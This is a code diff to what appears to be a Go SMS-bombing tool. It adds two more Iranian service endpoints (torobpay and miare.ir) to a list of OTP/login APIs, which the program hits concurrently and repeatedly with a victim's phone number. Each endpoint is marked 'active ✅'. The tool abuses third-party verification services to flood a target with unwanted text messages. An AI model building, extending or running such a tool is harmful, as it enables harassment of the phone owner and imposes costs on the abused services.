@@ -217,6 +217,12 @@ func main() {
 		go sms("https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // active ✅
+		go sms("https://api.torobpay.com/user/v1/login/", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  // active ✅
+		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  // active ✅
 
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
